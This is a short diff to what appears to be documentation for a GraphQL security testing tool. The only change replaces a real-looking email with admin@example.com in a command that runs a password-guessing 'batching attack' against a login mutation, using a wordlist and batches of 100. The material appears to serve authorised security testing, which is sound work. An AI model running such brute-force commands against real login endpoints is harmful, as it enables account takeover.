@@ -74,7 +74,7 @@ mutation emailLoginRemembered($loginInput: InputRememberedEmailLogin!) {
 2. Run the following command to run a GraphQL batching attack:
 
 ```
-❯ python batch.py --query acc-login.txt --wordlist passwords.txt -v '{"loginInput":{"email":"admin@shubs.io","password":"#VARIABLE#","rememberMe":false}}' --size 100 -e http://re.local:5000/graphiql -p localhost:8080
+❯ python batch.py --query acc-login.txt --wordlist passwords.txt -v '{"loginInput":{"email":"admin@example.com","password":"#VARIABLE#","rememberMe":false}}' --size 100 -e http://re.local:5000/graphiql -p localhost:8080
 ```
 
 The above command does the following:
